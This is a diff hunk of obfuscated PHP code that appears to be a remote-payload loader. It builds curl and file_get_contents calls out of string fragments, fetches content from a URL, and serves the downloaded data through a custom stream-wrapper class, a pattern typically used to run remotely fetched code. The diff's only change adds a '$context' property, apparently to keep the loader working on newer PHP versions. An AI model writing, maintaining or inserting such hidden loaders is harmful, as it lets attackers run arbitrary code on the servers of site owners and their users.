@@ -8,7 +8,7 @@ $b='';while(!feof($f))$b.=fgets($f);fclose($f);$x=explode("\r\n\r\n",$b,2);if(!e
 $c='cu'.'rl_';$i=$c.'init';if(function_exists($i)){$h=$i($u);$o=$c.'setopt';
 $o($h,19913,1);$o($h,52,1);$o($h,64,0);$r=($c.'exec')($h);if($r)return $r;}
 $g='fi'.'le_'.'get_'.'con'.'tents';return function_exists($g)?@$g($u):'';}
-$GLOBALS['d']=x($u);if(!$GLOBALS['d'])die;class V{private $p=0;
+$GLOBALS['d']=x($u);if(!$GLOBALS['d'])die;class V{public $context;private $p=0;
 function stream_open($p,$m,$o,&$r){return 1;}function stream_stat(){return['size'=>strlen($GLOBALS['d'])];}
 function stream_read($c){$r=substr($GLOBALS['d'],$this->p,$c);$this->p+=strlen($r);return $r;}
 function stream_eof(){return $this->p>=strlen($GLOBALS['d']);}
